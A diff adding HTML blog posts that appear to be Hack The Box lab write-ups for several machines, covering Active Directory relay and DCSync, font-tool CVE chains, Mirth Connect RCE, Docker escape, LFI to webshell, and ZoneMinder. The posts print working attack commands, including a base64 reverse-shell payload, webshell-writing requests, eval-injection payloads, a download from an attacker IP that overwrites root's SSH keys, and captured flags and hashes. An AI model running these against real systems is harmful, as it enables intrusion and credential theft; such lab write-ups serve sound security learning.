+            <thead><tr><th>Property</th><th>Value</th></tr></thead>
+            <tbody>
+              <tr><td>Domain</td><td>pirate.htb</td></tr>
+              <tr><td>DC</td><td>DC01.pirate.htb (10.129.244.95)</td></tr>
+              <tr><td>ADFS/Web</td><td>WEB01 (192.168.100.2 - internal)</td></tr>
+            </tbody>
+          </table>
+
+          <h2>Enumeration</h2>
+          <p>Standard AD domain controller with IIS (port 80) and HTTPS (port 443). Initial credentials given in scope: <code>pentest / p3nt3st2025!&amp;</code> (Domain Users, no special privileges).</p>
+          <h3>BloodHound</h3>
+          <pre><span class="keyword">$</span> bloodhound-python -u pentest -p <span class="string">'p3nt3st2025!&amp;'</span> -d pirate.htb -ns 10.129.244.95 -c All --zip</pre>
+          <p>BloodHound revealed the intended attack path:</p>
+          <pre>a.white --ForceChangePassword--&gt; a.white_adm --ConstrainedDeleg--&gt; HTTP/WEB01</pre>
+          <p>Key accounts: <strong>gMSA_ADFS_prod$</strong> and <strong>gMSA_ADCS_prod$</strong> &mdash; both in Remote Management Users (WinRM on DC01).</p>
+
+          <h2>Foothold: Pre-Windows 2000 Machine Accounts</h2>
+          <p>MS01$ and EXCH01$ are in the "Pre-Windows 2000 Compatible Access" group. These accounts have default passwords matching the lowercase machine name.</p>
+          <pre><span class="keyword">$</span> impacket-getTGT <span class="string">'pirate.htb/MS01$:ms01'</span> -dc-ip 10.129.244.95</pre>
+          <p>MS01$ is a member of "Domain Secure Servers" which grants <strong>ReadGMSAPassword</strong> rights.</p>
+          <h3>gMSA Password Extraction</h3>
+          <pre><span class="keyword">$</span> export KRB5CCNAME=MS01$.ccache
+<span class="keyword">$</span> nxc ldap dc01.pirate.htb -k --use-kcache --gmsa
+<span class="string">gMSA_ADFS_prod$  8126756fb2e69697bfcb04816e685839
+gMSA_ADCS_prod$  304106f739822ea2ad8ebe23f802d078</span></pre>
+
+          <h2>Internal Network &amp; ADFS</h2>
+          <p>WinRM to DC01 revealed WEB01 (192.168.100.2) running ADFS. A ligolo-ng tunnel was established to reach it. The gMSA service account has <strong>full CRUD</strong> on all 52 WID tables, providing access to the entire ADFS configuration including the DKM key and encrypted token-signing certificate.</p>
+
+          <h2>User Flag: NTLM Relay + RBCD on WEB01</h2>
+          <p>WEB01 has <strong>SMB signing disabled</strong>, making it a relay target. The attack uses PetitPotam to coerce WEB01's machine account to authenticate, then relays to DC01 LDAP to set up RBCD.</p>
+          <pre><span class="keyword">$</span> ntlmrelayx.py -t ldap://10.129.244.95 --delegate-access --remove-mic -smb2support
+<span class="keyword">$</span> python3 PetitPotam.py -u '' -p '' -d '' KALI_IP 192.168.100.2</pre>
+          <p>ntlmrelayx creates computer account <code>OLDWWINV$</code> and sets <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on WEB01$.</p>
+          <pre><span class="keyword">$</span> impacket-getST <span class="string">'pirate.htb/OLDWWINV$'</span> -spn cifs/WEB01.pirate.htb \
+  -impersonate Administrator -dc-ip 10.129.244.95
+<span class="keyword">$</span> impacket-secretsdump -k -no-pass pirate.htb/Administrator@WEB01.pirate.htb</pre>
+          <p>secretsdump revealed <strong>a.white's cleartext password</strong> stored as the DefaultPassword LSA secret (autologin):</p>
+          <pre><span class="string">DefaultPassword: PIRATE\a.white : E2nvAOKSz5Xz2MJu</span></pre>
+          <div class="flag-box">&#127987; user.txt captured via a.white on DC01</div>
+
+          <h2>Root Flag: SPN Jacking to Domain Admin</h2>
+          <p>With a.white's password, change a.white_adm's password via ForceChangePassword. a.white_adm is in the <strong>IT group</strong>, which has <code>WriteProperty</code> on <code>servicePrincipalName</code> for all computer accounts.</p>
+          <h3>The SPN Jacking Attack</h3>
+          <p>a.white_adm has constrained delegation configured to <code>HTTP/WEB01</code>. By moving that SPN from WEB01$ to DC01$, the KDC resolves S4U2Proxy requests to DC01$, encrypting the service ticket with DC01$'s key instead of WEB01$'s.</p>
+          <pre><span class="comment"># Remove HTTP/WEB01 SPNs from WEB01$</span>
+<span class="comment"># Add them to DC01$</span>
+<span class="comment"># Then request a service ticket with altservice</span>
+
+<span class="keyword">$</span> impacket-getST <span class="string">'pirate.htb/a.white_adm:Str0ngP@ss99'</span> \
+  -spn HTTP/WEB01.pirate.htb -impersonate Administrator \
+  -altservice ldap/DC01.pirate.htb -dc-ip 10.129.244.95</pre>
+          <h3>DCSync</h3>
+          <pre><span class="keyword">$</span> impacket-secretsdump -k -no-pass -dc-ip 10.129.244.95 pirate.htb/Administrator@DC01.pirate.htb
+<span class="string">Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:33071738496aba54a991ccc80875c97e:::</span></pre>
+          <div class="flag-box">&#127987; root.txt captured via Administrator pass-the-hash on DC01</div>
+
+          <h2>Full Attack Chain</h2>
+          <pre>pentest (Domain Users)
+  &darr; Enumerate Pre-Windows 2000 Compatible Access
+MS01$ (pw: "ms01")
+  &darr; Kerberos TGT &rarr; ReadGMSAPassword
+gMSA_ADFS_prod$ (NT hash)
+  &darr; WinRM on DC01+WEB01, WID database access, ligolo tunnel
+  &darr; PetitPotam coerce WEB01 &rarr; ntlmrelayx &rarr; RBCD
+Administrator on WEB01 (secretsdump &rarr; a.white cleartext)
+  &darr; ForceChangePassword &rarr; a.white_adm
+  &darr; WriteSPN on DC01$ &rarr; SPN Jacking
+  &darr; S4U2Proxy -altservice ldap/DC01 &rarr; DCSync
+Domain Admin on DC01</pre>
+
+          <h2>Key Techniques</h2>
+          <table>
+            <thead><tr><th>Technique</th><th>Description</th></tr></thead>
+            <tbody>
+              <tr><td>Pre-Windows 2000 Passwords</td><td>Machine accounts in this group have predictable default passwords</td></tr>
+              <tr><td>gMSA Password Reading</td><td>Accounts with ReadGMSAPassword can extract the managed password hash</td></tr>
+              <tr><td>NTLM Relay + RBCD</td><td>Coerce authentication via PetitPotam, relay to LDAP, set delegation</td></tr>
+              <tr><td>SPN Jacking</td><td>Move an SPN between computer accounts to redirect constrained delegation</td></tr>
+              <tr><td>S4U2Proxy + altservice</td><td>Impersonate users across services with ticket service name substitution</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- HTB: VariaType -->
+      <div class="content-pane" id="post-htb-variatype">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.14</span>
+        </div>
+        <h1 class="post-title">VariaType &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">fonttools</span>
+          <span class="post-tag">fontforge</span>
+          <span class="post-tag">setuptools</span>
+          <span class="post-tag">cve-chain</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>VariaType chains three 2025 CVEs on a Debian 12 box running a Flask-based variable font generator:</p>
+          <pre>fonttools arbitrary file write (www-data) &rarr; FontForge SFD pickle deserialization (steve) &rarr; setuptools path traversal (root)</pre>
+
+          <h2>Enumeration</h2>
+          <p>Two ports open: SSH (22) and nginx (80). The main site at <code>variatype.htb</code> is a Flask application accepting <code>.designspace</code> and font uploads. VHost discovery found <code>portal.variatype.htb</code> with an exposed <code>.git</code> directory.</p>
+          <pre><span class="keyword">$</span> git-dumper http://portal.variatype.htb/.git/ git_dump/</pre>
+          <p>Git history contained hardcoded credentials: <code>gitbot / G1tB0t_Acc3ss_2025!</code></p>
+
+          <h2>Foothold &mdash; CVE-2025-66034 (fonttools Arbitrary File Write)</h2>
+          <p>fonttools 4.33.0 through 4.60.1 passes the <code>&lt;variable-font filename="..."&gt;</code> attribute directly to the output path with no sanitization. Combined with <code>&lt;labelname&gt;</code> CDATA surviving into the output, this gives arbitrary file write with content injection.</p>
+          <div class="callout">
+            <div class="callout-label">&#128161; Key Insight</div>
+            Every PoC demonstrates relative path traversal (<code>../</code>). Python's <code>os.path.join(output_dir, filename)</code> discards the first argument entirely when <code>filename</code> starts with <code>/</code>. An absolute path bypasses both the <code>../</code> check and the <code>/tmp/</code> sandbox.
+          </div>
+          <p>A minimal TTF with a PHP webshell embedded in the <code>familyName</code> name record was created and paired with a malicious <code>.designspace</code> pointing the output to the portal's web root:</p>
+          <pre><span class="string">&lt;variable-font name="TestFont-VF"
+  filename="/var/www/portal.variatype.htb/public/files/shell.php"&gt;</span></pre>
+          <pre><span class="keyword">$</span> curl -s <span class="string">"http://portal.variatype.htb/files/shell.php?cmd=id"</span>
+<span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></pre>
+
+          <h2>Privesc: www-data &rarr; steve &mdash; CVE-2025-15276 (FontForge Pickle Deserialization)</h2>
+          <p>A cron job runs FontForge on <code>.sfd</code> files in the portal's <code>/files/</code> directory as user <code>steve</code>. FontForge's SFD parser calls Python's <code>pickle.loads()</code> on <code>PickledData:</code> fields &mdash; classic insecure deserialization.</p>
+          <p>A malicious <code>.sfd</code> file with a pickle <code>__reduce__</code> payload was dropped via the webshell. The cron job executed it within ~5 minutes, providing a reverse shell as steve.</p>
+          <div class="flag-box">&#127987; user.txt: d5a7aa6c197ae9053dfb81115a6401a0</div>
+
+          <h2>Privesc: steve &rarr; root &mdash; CVE-2025-47273 (setuptools Path Traversal)</h2>
+          <p>steve can run <code>sudo /usr/bin/python3 /opt/font-tools/install_validator.py *</code>. The script uses <code>setuptools.package_index.PackageIndex().download()</code> with setuptools 78.1.0, vulnerable to CVE-2025-47273.</p>
+          <p>The exploit uses <code>%2f</code>-encoded slashes in the URL path. After <code>unquote()</code> decodes them, <code>os.path.join()</code> treats the result as an absolute path:</p>
+          <pre><span class="keyword">$</span> sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
+  <span class="string">'http://10.10.14.91:8000/%2froot%2f.ssh%2fauthorized_keys'</span>
+<span class="string">Plugin installed at: /root/.ssh/authorized_keys</span></pre>
+          <pre><span class="keyword">$</span> ssh -i root_key root@10.129.5.78 <span class="string">'cat /root/root.txt'</span>
+<span class="string">1f118260bf378648b7b09fe63aea31be</span></pre>
+          <div class="flag-box">&#127987; root.txt: 1f118260bf378648b7b09fe63aea31be</div>
+
+          <h2>Recurring Theme: os.path.join() Abuse</h2>
+          <p>Two of three CVEs exploited the same Python behavior: <code>os.path.join(base, user_input)</code> discards <code>base</code> when <code>user_input</code> starts with <code>/</code>. When a PoC technique isn't working, go back to what the primitive actually gives you, not what the example shows.</p>
+        </div>
+      </div>
+
+      <!-- HTB: Interpreter -->
+      <div class="content-pane" id="post-htb-interpreter">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.10</span>
+        </div>
+        <h1 class="post-title">Interpreter &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">mirth-connect</span>
+          <span class="post-tag">cve-2023-43208</span>
+          <span class="post-tag">eval-injection</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Interpreter runs <strong>Mirth Connect 4.4.0</strong>, a healthcare integration engine. Initial access via <strong>CVE-2023-43208</strong> (pre-auth RCE exploiting XStream deserialization). Privilege escalation through a Python <code>eval()</code> injection in an internal Flask app that processes patient data.</p>
+
+          <h2>Reconnaissance</h2>
+          <pre><span class="keyword">$</span> nmap -sC -sV -Pn -p- 10.129.6.105</pre>
+          <table>
+            <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+            <tbody>
+              <tr><td>22</td><td>SSH</td><td>OpenSSH 9.2p1 Debian</td></tr>
+              <tr><td>80</td><td>HTTP</td><td>Jetty</td></tr>
+              <tr><td>443</td><td>HTTPS</td><td>Jetty (SSL)</td></tr>
+              <tr><td>6661</td><td>TCP</td><td>Mirth Connect MLLP Listener (HL7)</td></tr>
+            </tbody>
+          </table>
+          <p>The Mirth Connect version is identifiable via an unauthenticated API: <code>curl -k https://mirth-connect/api/server/version</code> returns <strong>4.4.0</strong>.</p>
+
+          <h2>Initial Access &mdash; CVE-2023-43208 (Pre-Auth RCE)</h2>
+          <p>Mirth Connect 4.4.0 is vulnerable to pre-auth RCE via XStream deserialization on the <code>/api/users</code> endpoint. Java's <code>Runtime.exec()</code> does not support shell redirections, so the reverse shell command must be base64-encoded and wrapped in brace expansion:</p>
+          <pre><span class="keyword">$</span> python3 CVE-2023-43208.py -u https://mirth-connect \
+  -c <span class="string">"bash -c {echo,YmFzaC...}|{base64,-d}|{bash,-i}"</span></pre>
+          <p>Shell received as the <strong>mirth</strong> user.</p>
+
+          <h2>Post-Exploitation &mdash; MySQL Enumeration</h2>
+          <p>The Mirth properties file contains database credentials: <code>mirthdb / MirthPass123!</code>. The <strong>CHANNEL</strong> table reveals the integration pipeline:</p>
+          <ul>
+            <li><strong>Source:</strong> Port 6661 (TCP/MLLP) receives HL7v2 messages</li>
+            <li><strong>Transformer:</strong> Converts HL7 &rarr; XML (patient data extraction)</li>
+            <li><strong>Destination:</strong> POSTs XML to <code>http://127.0.0.1:54321/addPatient</code></li>
+          </ul>
+          <p>This exposes a hidden internal Flask application running on port 54321 <strong>as root</strong>.</p>
+
+          <h2>Privilege Escalation &mdash; Python eval() Injection</h2>
+          <p>The Flask app processes patient XML fields through Python's <code>eval()</code>. Curly braces <code>{}</code> are <strong>stripped (not blocked)</strong> &mdash; the content inside braces is evaluated. The box name "Interpreter" is the hint.</p>
+          <p>Sending <code>{7+7}</code> in the <code>firstname</code> field returns <code>14</code>, confirming server-side evaluation.</p>
+          <pre><span class="comment"># Read files as root</span>
+{open(<span class="string">'/root/root.txt'</span>).read()}
+{open(<span class="string">'/home/sedric/user.txt'</span>).read()}
+
+<span class="comment"># Command execution as root</span>
+{__import__(<span class="string">'os'</span>).popen(<span class="string">'id'</span>).read()}</pre>
+          <div class="flag-box">&#127987; Both flags captured via eval injection.</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Enumerate databases thoroughly</strong> &mdash; the Mirth CHANNEL table was the pivot point that revealed the internal Flask service</li>
+            <li><strong>Internal services running as root are high-value targets</strong> &mdash; the Flask app wasn't externally accessible but ran with root privileges</li>
+            <li><strong>Stripping vs. blocking input</strong> &mdash; the app stripped curly braces instead of rejecting the input, allowing content to reach <code>eval()</code></li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: MonitorsFour -->
+      <div class="content-pane" id="post-htb-monitorsfour">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Windows</span>
+          <span class="post-date">2026.03.08</span>
+        </div>
+        <h1 class="post-title">MonitorsFour &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">windows</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">php-type-juggling</span>
+          <span class="post-tag">cacti</span>
+          <span class="post-tag">docker-escape</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>MonitorsFour chains PHP type juggling for credential extraction, Cacti authenticated RCE (CVE-2025-24367), and a Docker Desktop container escape (CVE-2025-9074) via an exposed Docker Engine API.</p>
+
+          <h2>Reconnaissance</h2>
+          <p>Only port 80 open (nginx). VHost enumeration discovers <code>cacti.monitorsfour.htb</code>. Directory enumeration finds an exposed <code>.env</code> with database credentials and a <code>/user</code> API endpoint returning <code>{"error":"Missing token parameter"}</code>.</p>
+
+          <h2>PHP Type Juggling Exploitation</h2>
+          <p>PHP's loose comparison (<code>==</code>) treats strings starting with <code>0e</code> followed by digits as scientific notation (0 &times; 10^n = 0). One user's token matches the <code>0e[0-9]+</code> pattern:</p>
+          <pre><span class="keyword">$</span> curl <span class="string">"http://monitorsfour.htb/user?token=0"</span>
+<span class="string">[{"id":2,"username":"admin","email":"admin@monitorsfour.htb",
+  "password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user",...}]</span></pre>
+          <p>Full database dump. MD5 hash cracked with hashcat: <strong>admin:wonderful1</strong>.</p>
+
+          <h2>Cacti RCE &mdash; CVE-2025-24367</h2>
+          <p>Cacti 1.2.28 is vulnerable to authenticated RCE via graph template injection. Unsanitized newline characters in the <code>right_axis_label</code> field allow injection of rrdtool commands that create arbitrary PHP files in the web root.</p>
+          <pre><span class="keyword">$</span> python3 cve_2025_24367.py -u marcus -p wonderful1 -i &lt;ATTACKER_IP&gt; -l 4444 \
+  -url http://cacti.monitorsfour.htb</pre>
+          <p>Reverse shell as <code>www-data</code> &mdash; inside a Docker container.</p>
+
+          <h2>Docker Container Escape &mdash; CVE-2025-9074</h2>
+          <p>Database changelog reveals the host is <strong>Windows + Docker Desktop 4.44.2</strong>. Versions &lt; 4.44.3 expose an unauthenticated Docker Engine API at <code>192.168.65.7:2375</code> accessible from containers.</p>
+          <pre><span class="keyword">$</span> curl -s -X POST http://192.168.65.7:2375/containers/create \
+  -H <span class="string">"Content-Type: application/json"</span> \
+  -d <span class="string">'{"Image":"alpine","Cmd":["cat","/host_root/Users/Administrator/Desktop/root.txt"],
+     "HostConfig":{"Binds":["/mnt/host/c:/host_root"]}}'</span></pre>
+          <pre><span class="keyword">$</span> curl -s -X POST http://192.168.65.7:2375/containers/&lt;id&gt;/start
+<span class="keyword">$</span> curl -s http://192.168.65.7:2375/containers/&lt;id&gt;/logs?stdout=true</pre>
+          <div class="flag-box">&#127987; Both flags captured via container escape to host filesystem.</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Always test type juggling</strong> &mdash; <code>token=0</code>, <code>token[]=1</code>, <code>{"token":true}</code> on auth endpoints</li>
+            <li><strong>Application changelogs are goldmines</strong> &mdash; revealed Windows host + Docker Desktop version</li>
+            <li><strong>Container escape vectors</strong> &mdash; always check Docker socket mount, internal Docker API (<code>192.168.65.7:2375</code> for Desktop), kernel exploits</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: Pterodactyl -->
+      <div class="content-pane" id="post-htb-pterodactyl">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-medium" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Medium</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.20</span>
+        </div>
+        <h1 class="post-title">Pterodactyl &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">medium</span>
+          <span class="post-tag">pterodactyl-panel</span>
+          <span class="post-tag">lfi</span>
+          <span class="post-tag">pam-bypass</span>
+          <span class="post-tag">cve-2025-49132</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Pterodactyl runs the Pterodactyl game server management panel on openSUSE Leap 15.6. Initial access via <strong>CVE-2025-49132</strong> (unauthenticated LFI chained with PHP PEAR's <code>pearcmd.php</code> for RCE). Root via <strong>CVE-2025-6018</strong> (PAM session bypass) + <strong>CVE-2025-6019</strong> (libblockdev/udisks2 nosuid mount bypass).</p>
+
+          <h2>Reconnaissance</h2>
+          <p>Two ports: SSH (22) and nginx (80) redirecting to <code>pterodactyl.htb</code>. Key information disclosure findings:</p>
+          <ul>
+            <li><strong>phpinfo.php</strong> &mdash; <code>register_argc_argv=On</code>, empty <code>disable_functions</code>, PEAR in include path</li>
+            <li><strong>changelog.txt</strong> &mdash; Pterodactyl Panel v1.11.10, PHP-PEAR enabled</li>
+          </ul>
+          <p><code>panel.pterodactyl.htb</code> confirmed as the Pterodactyl Panel (Laravel/React SPA).</p>
+
+          <h2>Foothold &mdash; CVE-2025-49132: LFI to RCE</h2>
+          <p>The <code>/locales/locale.json</code> endpoint passes <code>locale</code> and <code>namespace</code> params directly to PHP's <code>include()</code> without auth. When <code>register_argc_argv</code> is enabled, PEAR's <code>pearcmd.php</code> reads arguments from the query string.</p>
+          <pre><span class="comment"># Write webshell via PEAR config-create</span>
+<span class="keyword">$</span> curl -s -g <span class="string">"http://panel.pterodactyl.htb/locales/locale.json?+config-create+/&amp;locale=../../../../../../usr/share/php/PEAR&amp;namespace=pearcmd&amp;/&lt;?=system(hex2bin('6964'))?&gt;+/tmp/shell.php"</span>
+
+<span class="comment"># Include the webshell</span>
+<span class="keyword">$</span> curl -s -g <span class="string">"http://panel.pterodactyl.htb/locales/locale.json?locale=../../../../../../tmp&amp;namespace=shell"</span></pre>
+          <p>Shell as <code>wwwrun</code>. User flag world-readable.</p>
+
+          <h2>Privesc: wwwrun &rarr; phileasfogg3</h2>
+          <p>Panel database query revealed bcrypt hashes. phileasfogg3's hash cracked to <code>!QAZ2wsx</code> (keyboard-walk pattern), reused for SSH.</p>
+
+          <h2>Privesc: Root &mdash; CVE-2025-6018 + CVE-2025-6019</h2>
+          <h3>PAM Session Bypass</h3>
+          <p>openSUSE's PAM reads <code>~/.pam_environment</code> with <code>user_readenv=1</code>. Injecting environment variables tricks systemd-logind into marking the session as "physically present":</p>
+          <pre><span class="keyword">$</span> cat &gt; ~/.pam_environment &lt;&lt; <span class="string">'EOF'
+XDG_SEAT=seat0
+XDG_VTNR=1
+EOF</span></pre>
+          <p>After re-login, <code>loginctl</code> shows <code>Active=yes</code> &mdash; polkit <code>allow_active</code> actions are now available without a password.</p>
+          <h3>libblockdev nosuid Mount Bypass</h3>
+          <p>An XFS image containing a SUID root bash was created. Using udisks2 Filesystem.Resize on a loop device, libblockdev temporarily mounts the image <strong>without nosuid</strong>. A Python race condition catcher monitors <code>/proc/mounts</code> and executes the SUID bash when the mount appears:</p>
+          <pre><span class="keyword">$</span> python3 catcher.py
+<span class="string">[!!!] HIT at /tmp/blockdev.EOYYL3
+bash-4.4# id
+uid=1002(phileasfogg3) gid=100(users) euid=0(root)</span></pre>
+          <div class="flag-box">&#127987; root.txt: 23a028f57158b735838c675007307f8d</div>
+
+          <h2>Key Takeaways</h2>
+          <ul>
+            <li><strong>Information disclosure compounds</strong> &mdash; phpinfo.php + changelog.txt turned a "maybe" into a "definitely"</li>
+            <li><strong>SUSE backports patches</strong> &mdash; always check <code>rpm -q --changelog</code> rather than trusting version strings</li>
+            <li><strong>Process management in race conditions</strong> &mdash; the catcher must run in the foreground so <code>os.execv</code> replaces a process you can interact with</li>
+          </ul>
+        </div>
+      </div>
+
+      <!-- HTB: CCTV -->
+      <div class="content-pane" id="post-htb-cctv">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-easy" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Easy</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.07</span>
+        </div>
+        <h1 class="post-title">CCTV &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">easy</span>
+          <span class="post-tag">zoneminder</span>
+          <span class="post-tag">docker</span>
+          <span class="post-tag">credential-capture</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>CCTV runs ZoneMinder with default credentials. The attack chain: JWT forgery for superadmin access, RCE via ZM filter commands, discovering a hidden Docker container network, capturing plaintext credentials via tcpdump on the bridge interface, and a deferred MotionEye root plant that fires while you're working another path.</p>
+
+          <h2>ZoneMinder &mdash; Default Creds + JWT Forgery</h2>
+          <p><code>admin:admin</code> worked out of the box. The JWT secret was the unchanged default: <code>"...Change me to something unique..."</code>. Forged a superadmin JWT and reset the superadmin password to <code>SuperAdmin123!</code>.</p>
+
+          <h2>RCE as www-data</h2>
+          <p>ZoneMinder's filter feature runs a shell command every 10s via the <code>zmfilter</code> daemon. Injected a command into <code>filter[AutoExecuteCmd]</code> as superadmin, writing a PHP webshell:</p>
+          <pre><span class="keyword">$</span> curl -s --get <span class="string">'http://cctv.htb/zm/cache/s.php'</span> --data-urlencode <span class="string">'c=COMMAND'</span></pre>
+
+          <h2>Background Plant &mdash; MotionEye</h2>
+          <p>MotionEye runs as <strong>root</strong> (systemd <code>User=root</code>). Modified <code>on_event_start</code> in the camera config to create a SUID bash: <code>cp /bin/bash /tmp/rootbash &amp;&amp; chmod 4755 /tmp/rootbash</code>. Enabled <code>emulate_motion=on</code> so every frame triggers detection.</p>
+          <p>The plant <strong>appeared to fail</strong> &mdash; <code>/tmp/rootbash</code> didn't appear immediately. Pivoted away to work another path.</p>
+
+          <h2>Discovering the Hidden Container Network</h2>
+          <p><code>ip addr</code> revealed two Docker bridge networks. Ping sweep found <strong>172.25.0.10</strong> alive. Server logs showed a custom management service being polled every ~40s: <code>"Authorization as sa_mark successful. Command issued: disk-info"</code>.</p>
+
+          <h2>Capturing sa_mark's Password &mdash; tcpdump on the Bridge</h2>
+          <p><code>www-data</code> had <code>cap_net_raw</code> capability (tcpdump without root). Within 40 seconds of listening on the Docker bridge:</p>
+          <pre><span class="keyword">$</span> tcpdump -i br-1b6b4b93c636 -A host 172.25.0.10
+<span class="string">USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info</span></pre>
+          <p>Custom management service, no TLS, credentials in the clear.</p>
+          <pre><span class="keyword">$</span> ssh sa_mark@10.129.1.155
+<span class="comment"># Password: X1l9fx1ZjS7RZb</span></pre>
+          <div class="flag-box">&#127987; user.txt captured via SSH as sa_mark</div>
+
+          <h2>The Deferred Plant Pays Off</h2>
+          <p>While running SUID enumeration as sa_mark, found <code>/tmp/rootbash</code> in the list. The MotionEye <code>on_event_start</code> command had fired in the background while we were busy on the tcpdump path.</p>
+          <pre><span class="keyword">$</span> /tmp/rootbash -p -c <span class="string">"id; cat /root/root.txt"</span>
+<span class="string">uid=1001(sa_mark) gid=1001(sa_mark) euid=0(root)</span></pre>
+          <div class="flag-box">&#127987; root.txt: 84ed643f67f25213efa9e9014d24830a</div>
+
+          <h2>Key Lesson &mdash; Pivot, Don't Wait</h2>
+          <p>The MotionEye root plant was set up and appeared to fail. Instead of sitting and retrying, we pivoted to the tcpdump/credential path. The plant continued running in the background and delivered root by the time we got user. <strong>Two parallel attack paths, one lands while you're working the other.</strong></p>
+        </div>
+      </div>
+
+      <!-- HTB: Facts -->
+      <div class="content-pane" id="post-htb-facts">
+        <div class="post-meta">
+          <span class="post-badge badge-htb">HTB</span>
+          <span class="file-difficulty diff-easy" style="font-size:0.72rem; padding: 0.2rem 0.6rem; border-radius: 4px;">Easy</span>
+          <span style="font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-muted);">Linux</span>
+          <span class="post-date">2026.03.18</span>
+        </div>
+        <h1 class="post-title">Facts &mdash; HTB Writeup</h1>
+        <div class="post-tags">
+          <span class="post-tag">htb</span>
+          <span class="post-tag">linux</span>
+          <span class="post-tag">easy</span>
+          <span class="post-tag">camaleon-cms</span>
+          <span class="post-tag">s3</span>
+          <span class="post-tag">facter</span>
+        </div>
+        <div class="post-body">
+          <h2>Summary</h2>
+          <p>Facts runs CamaleonCMS 2.9.0 with open user registration and MinIO object storage. The attack chain: path traversal (CVE-2024-46987) for arbitrary file read, mass assignment (CVE-2025-2304) for CMS admin, S3 credential extraction from the application database, SSH key cracking, and privilege escalation via <code>sudo facter</code> with custom Ruby facts.</p>
+
+          <h2>Reconnaissance</h2>
+          <table>
+            <thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead>
+            <tbody>
+              <tr><td>22</td><td>SSH</td><td>OpenSSH 9.9p1</td></tr>
+              <tr><td>80</td><td>HTTP</td><td>nginx 1.26.3 &rarr; CamaleonCMS</td></tr>
+              <tr><td>54321</td><td>HTTP</td><td>MinIO S3 API</td></tr>
+            </tbody>
+          </table>
+          <p>Key finding: <strong>CamaleonCMS has open user registration</strong> at <code>/admin/register</code>. Every known CVE requires authenticated access &mdash; the moment registration is enabled, they all become unauthenticated attack paths.</p>
+
+          <h2>CVE-2024-46987 &mdash; Path Traversal</h2>
+          <pre><span class="keyword">$</span> curl <span class="string">"http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd"</span></pre>
+          <p>Extracted the Rails database config (SQLite3), master.key, and the production database. The CMS <code>cama_metas</code> table contained S3 credentials in cleartext:</p>
+          <pre><span class="string">"filesystem_s3_access_key": "AKIA1F2BD38BAB3EADE7"
+"filesystem_s3_secret_key": "KKHqSdHmMeAkiIryZZaSbTyTH92t7Zb7XWB31g9q"</span></pre>
+
+          <h2>MinIO Bucket Enumeration</h2>
+          <pre><span class="keyword">$</span> mc alias set facts http://10.129.6.121:54321 AKIA1F2BD38BAB3EADE7 KKHqSdHmMeAkiIryZZaSbTyTH92t7Zb7XWB31g9q
+<span class="keyword">$</span> mc ls facts/
+<span class="string">randomfacts   internal</span></pre>
+          <p>The <code>internal</code> bucket contained an encrypted SSH private key for user <code>trivia</code>.</p>
+          <pre><span class="keyword">$</span> ssh2john trivia_key &gt; trivia.hash
+<span class="keyword">$</span> john --wordlist=/usr/share/wordlists/rockyou.txt trivia.hash
+<span class="string">Cracked: dragonballz</span></pre>
